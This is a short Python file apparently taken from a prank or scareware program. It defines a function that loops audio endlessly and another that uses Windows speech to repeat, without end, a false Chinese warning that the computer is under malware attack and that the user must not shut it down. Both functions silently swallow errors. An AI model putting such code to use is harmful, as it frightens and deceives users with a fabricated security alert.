from win32com.client import Dispatch
from pygame import mixer


# 播放音频文件
def playAudio(path):
    try: 
        mixer.init()
        mixer.music.load(path)
        mixer.music.play(loops=-1)
        while mixer.music.get_busy(): pass
    except: pass


# 朗读文本
def speakText():
    try: 
        speaker = Dispatch("SAPI.SpVoice")
        while True: speaker.Speak("计算机正在遭受恶意软件攻击，系统正在努力清除恶意程序，请勿关闭计算机！")
    except: pass

